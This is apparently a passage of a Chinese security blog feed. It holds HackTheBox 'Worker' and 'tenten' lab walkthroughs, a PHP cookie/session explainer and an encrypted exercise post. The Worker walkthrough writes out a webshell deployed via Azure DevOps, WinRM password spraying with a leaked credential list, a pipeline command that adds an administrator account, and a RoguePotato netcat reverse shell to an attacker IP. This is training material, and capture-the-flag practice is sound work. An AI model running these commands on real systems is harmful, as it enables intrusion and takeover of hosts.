<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>回到开始，在svn log枚举处，发现了其他仓库</p>
<p><img src="/images/worker/6.png" alt="6"></p>
<p>这里必须进入之前checkout下载文件的目录，进行update跟新操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">svn update -r 2</span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/7.png" alt="7"></p>
<p>发现了其他文件</p>
<p>在powershell脚本中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; &quot;nathen&quot; </span><br><span class="line">$plain &#x3D; &quot;wendel98&quot;</span><br><span class="line">$pwd &#x3D; ($plain | ConvertTo-SecureString)</span><br><span class="line">$Credential &#x3D; New-Object System.Management.Automation.PSCredential $user, $pwd</span><br><span class="line">$args &#x3D; &quot;Copy-Site.ps1&quot;</span><br><span class="line">Start-Process powershell.exe -Credential $Credential -ArgumentList (&quot;-file $args&quot;)</span><br></pre></td></tr></table></figure>

<p>发现了凭据<code>nathen/wendel98</code>。检查其他的仓库，没有有价值的发现</p>
<p>在拥有凭据后，尝试登录之前需要凭据的页面，发现运行着Azure Devops</p>
<p><img src="/images/worker/8.png" alt="8"></p>
<p>而且似乎正在部署一个web项目到w盘，也许可以利用这点上传webshell</p>
<p><img src="/images/worker/9.png" alt="9"></p>
<p>将该项目clone到本地</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone http:&#x2F;&#x2F;devops.worker.htb&#x2F;ekenas&#x2F;SmartHotel360&#x2F;_git&#x2F;spectral</span><br></pre></td></tr></table></figure>

<p>将webshell放入这里，由于IIS中间级，所以放入aspx或asp shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;test&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p>master分支不可以直接push，这个问题是可预期的</p>
<p><img src="/images/worker/10.png" alt="10"></p>
<p>建一个evil分支推上去试试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b evil</span><br><span class="line">git push -u origin evil</span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/11.png" alt="11"></p>
<p>之后可以去页面上查看到evil分支，确定push成功</p>
<p><img src="/images/worker/12.png" alt="12"></p>
<p>之后我们就可以创建pull request，进行修改。<br>之后别忘了<code>Approve</code>和<code>Complete</code>就行，这样webshell就应该被部署了到网站上了</p>
<p><img src="/images/worker/13.png" alt="13"></p>
<p>访问webshell</p>
<p><img src="/images/worker/14.png" alt="14"></p>
<p>之后反弹到本地</p>
<p><img src="/images/worker/15.png" alt="15"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>进入Users目录寻找user的flag，看到robisl，应该要先提权到用户权限</p>
<p><img src="/images/worker/16.png" alt="16"></p>
<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>之前显示了有一个部署的磁盘W</p>
<p><img src="/images/worker/18.png" alt="18"></p>
<p>在W盘的svn目录找到了凭据</p>
<p><img src="/images/worker/19.png" alt="19"></p>
<h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">### This file is an example password file for svnserve.                                                                                                 </span><br><span class="line">### Its format is similar to that of svnserve.conf. As shown in the                                                                                     </span><br><span class="line">### example below it contains one section labelled [users].                                                                                             </span><br><span class="line">### The name and password for each user follow, one account per line.                                                                                   </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">[users]                                                                                                                                                 </span><br><span class="line">nathen &#x3D; wendel98                                                                                                                                       </span><br><span class="line">nichin &#x3D; fqerfqerf</span><br><span class="line">nichin &#x3D; asifhiefh</span><br><span class="line">noahip &#x3D; player</span><br><span class="line">nuahip &#x3D; wkjdnw</span><br><span class="line">oakhol &#x3D; bxwdjhcue</span><br><span class="line">owehol &#x3D; supersecret</span><br><span class="line">paihol &#x3D; painfulcode</span><br><span class="line">parhol &#x3D; gitcommit</span><br><span class="line">pathop &#x3D; iliketomoveit</span><br><span class="line">pauhor &#x3D; nowayjose</span><br><span class="line">payhos &#x3D; icanjive</span><br><span class="line">perhou &#x3D; elvisisalive</span><br><span class="line">peyhou &#x3D; ineedvacation</span><br><span class="line">phihou &#x3D; pokemon</span><br><span class="line">quehub &#x3D; pickme</span><br><span class="line">quihud &#x3D; kindasecure</span><br><span class="line">rachul &#x3D; guesswho</span><br><span class="line">raehun &#x3D; idontknow</span><br><span class="line">ramhun &#x3D; thisis</span><br><span class="line">ranhut &#x3D; getting</span><br><span class="line">rebhyd &#x3D; rediculous</span><br><span class="line">reeinc &#x3D; iagree</span><br><span class="line">reeing &#x3D; tosomepoint</span><br><span class="line">reiing &#x3D; isthisenough</span><br><span class="line">renipr &#x3D; dummy</span><br><span class="line">rhiire &#x3D; users</span><br><span class="line">riairv &#x3D; canyou</span><br><span class="line">ricisa &#x3D; seewhich</span><br><span class="line">robish &#x3D; onesare</span><br><span class="line">robisl &#x3D; wolves11</span><br><span class="line">robive &#x3D; andwhich</span><br><span class="line">ronkay &#x3D; onesare</span><br><span class="line">rubkei &#x3D; the</span><br><span class="line">rupkel &#x3D; sheeps</span><br><span class="line">ryakel &#x3D; imtired</span><br><span class="line">sabken &#x3D; drjones</span><br><span class="line">samken &#x3D; aqua</span><br><span class="line">sapket &#x3D; hamburger</span><br><span class="line">sarkil &#x3D; friday</span><br></pre></td></tr></table></figure>

<p>提取账户和密码，通过crackmapexec对winrm进行爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec winrm 10.10.10.203 -u users -p passwords --no-bruteforce --continue-on-success </span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/20.png" alt="20"></p>
<p>得到凭据<code>robisl/wolves11</code></p>
<p>之后就能获得evil-winrm连过去即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.203 -u robisl -p wolves11</span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/21.png" alt="21"></p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>使用robisl登录azure，发现了新的项目</p>
<p><img src="/images/worker/22.png" alt="22"></p>
<p>仔细枚举可以发现，robisl是Build Administrator组的成员</p>
<p><img src="/images/worker/23.png" alt="23"></p>
<p><img src="/images/worker/24.png" alt="24"></p>
<p>在代理池里可以发现username为主机名，表示部署任务都会以SYSTEM权限运行</p>
<p><img src="/images/worker/25.png" alt="25"></p>
<p>现在去创建自己的部署任务即可，添加powershell</p>
<p><img src="/images/worker/26.png" alt="26"></p>
<p>执行的命令为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user hack p@ssw0rd123 &#x2F;add;net localgroup administrators hack &#x2F;add;net localgroup administrators robisl &#x2F;add;net user administrator p@ssw0rd123</span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/27.png" alt="27"></p>
<p>最后随便连个Administrator组的用户过去即可</p>
<p><img src="/images/worker/28.png" alt="28"></p>
<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>考虑到当前用户是个service account，具有<code>SeImpersonatePrivilege</code></p>
<p><img src="/images/worker/17.png" alt="17"></p>
<p>应该可以用roguepotato一把梭，但是有一个可预期的问题是，对方存在防火墙，导致RPC连接无法连接目标的OxidResolver</p>
<p><img src="/images/worker/29.png" alt="29"></p>
<p>平常只需要端口转发，这里需要额外的反向隧道绕过防火墙，因此需要两个shell</p>
<p>先建立隧道，这里使用chisel</p>
<p>攻击者监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;chisel server --reverse --port 4000</span><br></pre></td></tr></table></figure>

<p>受害者建立反向隧道，让攻击者的9999端口流量转发到本地的9999端口，即OxidResolver监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\chisel64 client 10.10.16.2:4000 R:9999:127.0.0.1:9999</span><br></pre></td></tr></table></figure>

<p>同时攻击者将自己135端口流量转发到自己的9999端口，这是Roguepotato的局限性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999</span><br></pre></td></tr></table></figure>

<p>之后一把梭</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\roguepotato.exe -r 10.10.16.2 -e &quot;C:\Users\Public\Documents\nc64.exe -nv 10.10.16.2 1337 -e cmd&quot; -l 9999</span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/30.png" alt="30"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>cookie和session</title>
    <url>/2019/11/08/cookie%E5%92%8Csession/</url>
    <content><![CDATA[<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>用户用浏览器访问时，Cookie以 <code>Key/Value</code>的形式作为用户标识</p>
<a id="more"></a>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">setcookie(name,value,expire,path,domain,secure,httponly);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>name:cookie的名称。服务器用来发出请求的cookie的名字</p>
</li>
<li><p>value:cookie的内容</p>
</li>
<li><p>expire:可选。cookie截至日期的Unix时间戳。通常使用time()加上或减去一定秒数。默认当浏览器关闭时，cookie就会到期</p>
</li>
<li><p>path:可选。服务器上cookie的路径，如果是/，cookie可以覆盖整个域，如果是一个子目录，cookie只在该目录中有效。默认值为当前cookie正被设置的当前目录。</p>
</li>
<li><p>domain:可选。cookie的互联网域名，如果是a.com，cookie对所有a.com和它的子域可用，如b.a.com<br>如果是c.b.com。cookie对c.b.com和它的子域可用，对b.com不可用。</p>
</li>
<li><p>secure:可选项。cookie是否必须通过https连接。如果值为TRUE，cookie只能在安全连接上传递。默认FALSE</p>
</li>
<li><p>httponly:可选项。(PHP5.2.0版本后实现的功能)。cookie是否必须使用HTTP协议。如果值为TRUE，脚本语言如Javascript无法访问cookie。默认值为FALSE</p>
</li>
</ul>
<h2 id="操作cookie"><a href="#操作cookie" class="headerlink" title="操作cookie"></a>操作cookie</h2><h3 id="设置cookie"><a href="#设置cookie" class="headerlink" title="设置cookie"></a>设置cookie</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="string">&#x27;username&#x27;</span>,uniqid(),time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>,<span class="string">&#x27;/&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="读取cookie"><a href="#读取cookie" class="headerlink" title="读取cookie"></a>读取cookie</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;username&#x27;</span>])) $username=$_COOKIE[<span class="string">&#x27;username&#x27;</span>];</span><br></pre></td></tr></table></figure>

<h3 id="删除cookie"><a href="#删除cookie" class="headerlink" title="删除cookie"></a>删除cookie</h3><p>删除cookie除了时间戳以外其他所有参数必须和第一次发送cookie时的参数一致，否则删除失败</p>
<p>为了防止客户日期和时间设置错误，这个例子我设置了1个月的cookie过期时间</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="string">&#x27;username&#x27;</span>,uniqid(),time()<span class="number">-2592000</span>,<span class="string">&#x27;/&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>Cookie的分类</p>
<ul>
<li>会话级别Cookie：所谓会话级别Cookie，就是在浏览器关闭之后Cookie就会失效。</li>
<li>持久级别Cookie：保存在硬盘的Cookie，只要设置了过期时间就是硬盘级别Cookie。</li>
</ul>
<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>Cookie是有大小限制和数量限制的，并且越来越多的Cookie代表客户端和服务器的传输量增加<br>Session则解决了这个问题，每次只传一个唯一ID( <strong>Session是基于Cookie来工作的</strong> ) ，通过这个ID在服务器上查找用户信息。</p>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>每次我们访问一个页面，如果有开启session，也就是有session_start() 时，就会自动生成一个session_id 来标注是这次会话的唯一ID，生成一个<code>sess_seesion_id</code>文件（通常在/tmp）。当有写入$SESSION的时候，就会往这个文件里序列化写入数据，同时也会自动往cookie里写入一个名字为PHPSESSID的变量， 它的值正为session_id 。由于默认生成的这个PHPSESSID cookie是会话，也就是说关闭浏览器就会过期掉，所以，下次重新浏览时，会重新生成一个session_id，并生成一个新文件。</p>
<h3 id="session的销毁"><a href="#session的销毁" class="headerlink" title="session的销毁"></a><strong>session的销毁</strong></h3><p>这里有一个误区，session的生命周期不是随着浏览器打开就创建，浏览器关闭就销毁。session的声明周期是从创建到超时过期。也就是说，当session创建后，浏览器关闭，会话级别的Cookie被销毁，如果没有超过设定时间，该SessionID对应的session是没有被销毁的<br>销毁session的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unset( $_SESSION[&#39;user&#39;])；&#x2F;&#x2F;销毁单个会话</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_SESSION &#x3D; array();</span><br><span class="line">session_destroy()；&#x2F;&#x2F;销毁多个会话</span><br></pre></td></tr></table></figure>

<p>设置超时</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> ini_get(<span class="string">&#x27;session.gc_maxlifetime&#x27;</span>);		<span class="comment">//显示超时周期</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.gc_maxlifetime&#x27;</span>,<span class="number">60</span>*<span class="number">24</span>*<span class="number">24</span>); <span class="comment">//修改超时时间为1天</span></span><br></pre></td></tr></table></figure>

<h3 id="会话安全"><a href="#会话安全" class="headerlink" title="会话安全"></a>会话安全</h3><p>最好使用https<br>其次进行多重校验，如检测ip，检测UA</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SESSION[<span class="string">&#x27;ip&#x27;</span>]=$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]</span><br><span class="line">$_SESSION[<span class="string">&#x27;UA&#x27;</span>]=$_SERVER[<span class="string">&quot;HTTP_USER_AGENT&quot;</span>]</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;ip&#x27;</span>] != $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>] <span class="keyword">or</span></span><br><span class="line">   $_SESSION[<span class="string">&#x27;UA&#x27;</span>] != $_SERVER[<span class="string">&quot;HTTP_USER_AGENT&quot;</span>]) diffenrent_user();</span><br></pre></td></tr></table></figure>

<p>最好different_user处不要做过多处理 ，直接删除当前对话，要求重新登录</p>
<h1 id="二者的异同"><a href="#二者的异同" class="headerlink" title="二者的异同"></a><strong>二者的异同</strong></h1><p>相同点(有关系的地方)：</p>
<ul>
<li>Session和Cookie都是为了让http协议又状态而存在</li>
<li>Session通过Cookie工作，Cookie传输的SessionID让Session知道这个客户端到底是谁</li>
</ul>
<p>不同点：</p>
<ul>
<li>Session将信息保存到服务器，Cookie将信息保存在客户端</li>
<li> Cookie存储的数据在不同的浏览器会有不同的限制，一般在同一个域名下，Cookie变量数量控制在20个以内，每个cookie值的大小控制在4kb以内。session值没有大小和数量限制，但如果数量过多，会增大服务器的压力 </li>
<li> cookie保存的内容是字符串，而服务器中的session保存的数据是对象</li>
</ul>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
  </entry>
  <entry>
    <title>HTB:tenten</title>
    <url>/2021/05/07/HTB-tenten/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/tenten/1.png" alt="1"></p>
<p>打开后站点是wordpress</p>
<p><img src="/images/tenten/3.png" alt="3"></p>
<p>可以通过url<code>http://10.10.10.10/index.php/wp-json/wp/v2/users/</code>对用户进行枚举</p>
<p><img src="/images/tenten/2.png" alt="2"></p>
<p>默认的admin看来没有启用，只有</p>
<p><img src="/images/tenten/4.png" alt="4"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>wpscan发现了漏洞插件</p>
<p><img src="/images/tenten/5.png" alt="5"></p>
<p>查询CVE-2015-6668漏洞，说的是可以通过暴力破解来读取任意cv文件，exp<a href="https://gist.github.com/DoMINAToR98/4ed677db5832e4b4db41c9fa48e7bdef">链接</a></p>
<p>快速阅读这个python脚本，它需要我们输入一个filename，可以通过<code>http://10.10.10.10/index.php/jobs/apply/FUZZ/</code>得到，这里的13很有意思，名称叫做<code>HackerAccessGranted</code></p>
<p><img src="/images/tenten/6.png" alt="6"></p>
<p>运行python PoC脚本，得到一张图片</p>
<p><img src="/images/tenten/7.png" alt="7"></p>
<p>访问并下载，使用steghide解决图片隐写，密码为空</p>
<p><img src="/images/tenten/8.png" alt="8"></p>
<p>得到ssh私钥，但是被加密了，可以使用john来破解它</p>
<p><img src="/images/tenten/9.png" alt="9"></p>
<p>ssh到takis即可</p>
<p><img src="/images/tenten/10.png" alt="10"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>发现了sudo权限不需要密码的程序</p>
<p><img src="/images/tenten/11.png" alt="11"></p>
<p>传个参数过去就好了</p>
<p><img src="/images/tenten/12.png" alt="12"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>x86缓冲区溢出练习题</title>
    <url>/2020/07/11/x86%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="590b593467499a1339c6028443a7c6b548ab4b63f61994e899e3f07f8dc8f077">23912ef0837b69f2825ee2a9de617ec6ee125adb8b4704116394f841bf1edaf0ff0a94c1ca20823cac2bea4616118d937acd424d24cf2f4b2d153280ce7ad9e110cf65d964a1fcf6497b9d4b61c8afcd9c2e2c41345e6b9f2da14b40b5730100bdf232b5d84013ab42c7d94ffb0d620d08930c99e3ad21cb53c618d8745b02ed97a47bc3fad08f3189e211b24f73d44cef47b0913691d7ae08161be7ecc768284ebbf43ccab92c974cfaa6a5ffc3f4ccd95f5954db76f1c15596877d4c3948fe0368e99130371d2e8dc141c152f9effffcca908b33654064b953a0344b012a838dbe3682ef322c7581a55764a78705823760681d47433658eb6c9425a919695ab66168bdcc040af15dbf1ca528dba7a01484076d57cbeccbbb3cd1e13e76bcd35f63b208d5d6f7226793413eb3e0d56cd0c4f358b55bae38c05f0608b50ac63d99e88d2f2cda35081079d8c6cd946249c12ea4ca9085d9a5648d7772f6af08d23d8e48b0a059655650b233dd7afa5ffb23ee8a505fa5248d0d94b8024769e59cd49b932c52b6d7fd408ad35512e09fa383c135ba70580ffa709c6fe7abad5ef1464079b548a4ad99113a9a33baf299e781ea7f39332996fea92ccb81770dfa9246dcc7ce4ddec6d0bbad175b71f52003bf0d2ac2c18098aab73326210208725861953b9988a87a72fdd4852e0decb85a79301035bf3f8e0c75340a84768b4272bed8625f8a650a8829228b22389ea58c401f9e97fc995e92a0a4bc2f72f041888f6975a29b06ecf6cdf6c174455d79ed7cb967fca55ef40c581ee8c844b0da708f9ff23e4d855f9f777f79ec2302739fa4e0ffa30668ff9d02e111b7dbb2ee4cdb9c0236cdd7b479c43e3646aa57fd8525f2ced47cc5b1045708910353057a5aba73b74c1abebb0504d4c5c887ca54b3ab2c1f77f5db87325bbff7d51ce3964bf30121f49716097bc61cfd3a7470ade11b37153ecdf8ae8915b4bbc415f41bd0fd42ea14cfb23179b6424e3a30d37c40f094ddc8e641f9764777cfa169a54d96c8c7e6f526b5f6117a92f9ebf4790da7221be9ea7c31ccbf5276bbef0c2a74a660571e65e21979b0e2f965faea1ef4cfb9ffe4d72e04bac564b616e2ea377b9e05e5afbe19fdbaa6b8e94bedae78bd4336d70c5d245fb4c81fda7c7b1793d24d2a08da2c7560013e1d05fabc5f1512b4936d1b1fb0f6309f09016e922c53320a92391a3a21ed052ee5a51f35d155f2ccbc2ccff66fc232cce89f2fbdcab3b218a1fbc88fe9428ac2d3697673c75c789d42fa52be1fc27cc9ddadbb7ba9699981040b1d0c7f96a1ca4a13418960943a2ea2299f88102483e0ab2f85ffe0fd8d832b69a917332c082f2e710e45ca4dd93fd138096dac09adeedfdbe1045c784770e51fd0c234fcb795e7a0d942d66a0c2778db99154032b945445392143fcbc398126c186045214c0f73015827b535bf41f07289be0fd6b4f23427bc3b597df88343a8004e9feacdd28b86840ed331e40de406a678e489ec577f16ba28d0b344c7ded30e6a0bdf46262ad96fb15796397b50aa9dcb3495d606fef61091dad8261d2046cb1749ef8431a64dc359087d1911e8a87b73cfa21ef682cabb7c37e71c007c3a86c4bcf79a0f03e9566c405ceb425825fe3af90ddc12ecb1e015f80fbdc0cf4656f6b51f03e193d8bcc566b24d19b86e6a464de390010c77eec150512eead19c5cf48f7964acb327ec956ca5e4f92d236a22d4054fb3e142a5b2aad4ce1982b684414131e2b8bc38b87b3411e1fde62b462e36d03dcceae73422a9e92315631a7aa316f7c2cf014a5b667a368db75dbb73c681ce229fd90975f26e4304b74a509bd555aeb1b27a2012b23b1cb6ab3cb563ac291fef5b13e2b55eef98a60bf0cbc469689701c534d1af02e9d1ab3401e960771f072d8c82cd697a1f97325906299ab64e2cb8e0fdb5ccbad22ccaa68ffbde545ffe4a91afc3455b308e716916ff4fcf04df2fa1cf26edbf152f98250290cc5fbdd97bc3f90605d894578d1bddda81d642bfa6f1bd0aad7161dfd23ea40fb4d92ccbb0b2107eea0ed726ab3b0b993c672562727b59c4757b8b3006f53fe434222c1ff44d627c5dac75f6f71e95ccb22e468f30632bd808521a7a88733d3dbae194dce1f6957c77785990eb4c53645c2864c7046ac6ec557cd91a0041dca954869841ab65112206fd9795097533e1722405bd9a11522d10cdffb2edba39b0f818220a692f1b48a05e575fe610578990f2e03ede01c22c8f395fb0be85a341b5a1534641492341e5230bbf03811d94f44ebdb41bcd5e6d614b7a3c876e42a7308a7da3012f113891d621331e59fdeafe3628230502b9a425874da3e4a4319ce2b29b0add697255e37f1140ae45fca663345b0b1a831a3b9ccb58913c80faff492cb591083db026cf035edbb5a93c60c2536a667d601aee5ae121a4a8edf6f89aaa58739b5d30b09f7ccce1675331a6daca92c2e5a941944359701228fbc2c546d2542567f1e12d89c294e444b88952102d852a65547f69f87a411112c1e011d51df129a239f8132a17f8fdc75335ab25fc6bdd0351fa79398ab604d27a5cc4777b3c4dce6d56acc4796b3245a9063d65830ab998ebb09821692039eee45e9ad1ad369e722b3ee3d7e3e64c5b8728957d7af5d7f13a98fcde7cbacba0a4f947172bca80ee4f91a31d9f76d109bd72bddf1c6032c93cd988ad718ae7e10ca258f1b55ce188966fa3a3b4ada77920ee92a9c3989766e7694ed412af3a4f3cde2a8a6b68e6016a68d6bd7152c19575233c85c64ff2f41c1871dede725ef45f2a2277c7b1d7673e8150328a24f8adbb99bd68ff8a519c9ffed13ba968b333ca5f9b5ddb69e24670d4982757318a865aab4f9e7b75ead3e83fb204f813c698b0d530b10c5b4e31ff5a67d74ea58f39d738c735b8481b6d5f90a000feefef769dce4648ef0e30b9f2080b531c4a3a3f7fb2f95d96e36dd9747baf7fa1fc0108aa562e8b43fc9c3d83190ae7ecfeece680cbb48735dba39902a9ce5a661ca1b490d8d874d43b1f939fb2ab21b3eeae5b7be1187a1ad90b09a8984770b8a8a0045c568efa8634f4593a74085164f69d4427a2f3725bdd3fbb42532cfb83a53426d5f29add04597af8f23858619636c6a657052da956a64857fd7c0d30071b4ee16a64f06e0152c62f5a753af9e2a95721d733227aab4742d9147c9abe6ca8b555de571c771e85c6226c3fbe8f58f548180d8ca9dc108ea1d4cabf5b9df96cfda3cc2284e81c1f8f20ff5238bed1c5b8d8f48c4e930ad28234bf79ac66b24e75116276c0a1894d23bdf5ef67934bb3f11a3fc3c1c2776c91f29ec0ea8e3a7b8c1c40f4f581a5ae52c0f383c538b2ead4321bb10779ed2930d24016e3ab3c49ea81c29f691658433a1a950ddbac0918e63b4147d68ce6e3e6acc756f7a94bdeca94be981931240b4242d40cb7ce7f121a5ba3e9fd4403bd1864970a228d9c157b10a1718b3cdd422df8d9471cda713f4c16ddf17b90cca3fec5d20005416e31c62fda5f13f280d09e4d2ed28860d0f5d3b5b8c257aff1ee9fb759bb20f732cbf6159b454399650cae899ef9df32c98fb6b938454362ab7985c363d55f971dc0d6d73122cf59edfba81f3a7b472f7a2a5009a374fe2bfa5fc913a4a98a42a0102af33605d42650c9f940aa0f8aa8e30c77e0abe79f2687f69dbe553205e4eaf6f70f19ea6f5b7b4a706b8bd2d8580d4a0b0b4807e333adf8af96aa25cdbddb824e19976fc265aeb6e16db34f280f1106ee98d6934deb72edf35facfb594a47c6320788d5b4f96be0034cbf869f1b9f0c1db2058f705bfc817b4031ee9ef9c23792e879de027c9730f00975815e6583d536cab5b10fa1b3a783d1ef43b465126daa739c2ca439636ffcc849da8365c483ec7a62284fbb16fec0990c6db95ff4400df97f0a0107dfda5689a9f5bd519059123c3f3e0c1a54fac37a3071afb11d1d83cb1f19f2dc790f65450fa19d949972bf99a7d99aa20273970414cd0b81461063e924ed611f6d539819d17ac6feb2f617d83961d98cb87f97494192e040aaa833ea06650ba21197ed48ad5889a864afdbd7646ffabb94dd9e2b67cde6a9beecbd6a3da6de2899289d3641a82d78e4b1d02f4917c09e2673cb7dc227ee89d696fe3422cdf76a0a82a3c90b0c3b60af3931814bc974287a2e1dedef28712b003265252982e55834a6760cbf5f919304d962c2f1def780ae23268de91e880393ffd247a13f66675fa1fcd745a71abe17e250de4919e9dafac02e14aa6f0ad3ce1347044f1970de02323a74cf7209c72bc75fcadd959fb63bd9b6778f525998ca43296ef5044a5b833fd891a22384a62f356ca2f850609fd69790c7cd238012cb4eb166dd4ec46910dabcdbf3057cc51d2802ae1bb13d33c8b113763ea75799f130e0762b09c806d6430921da5aa66bf1a3e6651d2c8b7e25866f1b368ef0fdddce1656e906ec4166e522c44afa05518f7ef828bd583982e46e8384ef718638e96a0068d55e87f4e8a15370ae675e8bc8e73d49becde11601c6d9eaf21d0e2b82d8df4373a7af45d7ca9271e5e3eeb89215e654dab2393dcb7eec997a326d27d914ce6350403585d0d97a43bfae68b37b006f72bb557ae26e438456d66e2aba07b74015403d33dbbffa47c95f7ce33989013b292a4ad2e578e2d327e588a4ec8b5c41ed84d9b495ff7087a6cce33f4b45dd1064aa3dd520d693dcd4449a98b88e4f08c1df22de62f99bac40c3e04c99d6d8025efa479fa5f910a0440395eea107532dbeb3786237853bd40bdbd6b43212954ea1a9a40060109f87e1640c9faf6b2cdb8406ca8db6deca796176ad3cd25e9b556eac1eade2afb30cf769b924d8c46cee098551d31b5bbbfa82fc39a4e8bbcc4aabdfddfd98356123f4076461713018e4c311d6fa9f08e4c269bab98235359bd2f860fca3e8482e295cc8f02149575b47c2bcb0f4c64815e77e3a5b929f69fae2d0c51dc50d31cc902bb25cb701d79ff60949d5699ab6235da3f3403d43db986c7112e534993994611aa2af205491a3ef1f188ccaa78365311f30d63568e14c3abc6e47694c4858eb7897575e6c3c31acbf79d95383ebf5b6a7d6a5b5e4089a1a444809d23afd9fecccb92b076b934e347c8e0913655a1ede3d35e1d7eabedc5bcdb4f31e5c5220ffee9d2a8619f3abce2cf76e36826b9358a70fedd283ebdd6d5a7e1229def97dc85973e6de1d75969a515f4b7e1482486d03286c811d722fb56bc8aaf3f51ea7b9ff7e6e28969fd33efa52cd6559c411e20dac0563f92d7a95d7ab1569c0328cb55ba1382cd8c6478b951e674dd588cdf6eb3ab3eb31bec481ed357f1cacdd93895db6a3179c6e425f5bb37b9fcda7647d37f94059409fcfde07e16620d3e69a2664f234b38f391063406e68d2f3e466ad89a939eb46ca1523b33c41dd6b1c9f971c13d8850a7ea635bb6056a312797f952dcbf7e8e20aeeb97da96a311ef41acc3e9ad22e909c10aee41e6a12f18c8df98ac5f39e0f1b5c818a39ead114c1b46c9c0324c2f806b83e7f61f01a9de539d2fbc67cc087da79b9fd45c20215e2ce661deccb77be0cb89d80813415d4b680cb173a450bfd186f73697c2a1fb753d6c211a53ad633c668fb0059e1512d689a355ccb2c31b77fc3e7bcce07000a8594b4463d2b927cfba5991a89811d6f5d4a07103fc167f07d59ce1b23b8754dfd8620444b9406c587d3860ddcf341fb6def9b29f7e5374a85e7af4d42e1d5bb2eb445d65179d4600fd4a7acbb6a93bc2f3105de6594397caa15803fb5d9c2cc433b5c2d294cc2b12508341f8ef23bd047d56e57d66bc3eeebaac4d9dc21edbccbe191f167d657bd830a0b2a074db6bc16d1b7e0b1b0da59e45eea314135450f2010c869228cf8901bb83d42995690efe022192f31fde318be42aa1b28f9e7a2b3433ee66b8d536e0eb0a4d856d14d1ab5bdbd3e8b533840fbf1bd845b219ef9a7653759df69e5261045ea654cfad326d0c05ff542fbbee12a51e311856b020a51a896178e2f07e26693963f0e7f5a6b99c5f5bfd4c755d83bedc64311b0efc2d25c363291e14de5dfead59fa611a27c089fc23d41370516e889dbc990a3df9346870b938627e249132a4889f0051d84fe1f7195fcbae1ea25bebbdc389251d60bc6662b5ccb4b7966689d058cc7f491ff4b78ed3d11a8bd06a80e442f185046a8948b4d337e434bf7f57259cd88b4b2d5ae005559817852d45c01183fcea0708ce89aed1a51224b5807e36d19652e018691153e45f317fd5fe8ce0472d6c4941afbc1b1eb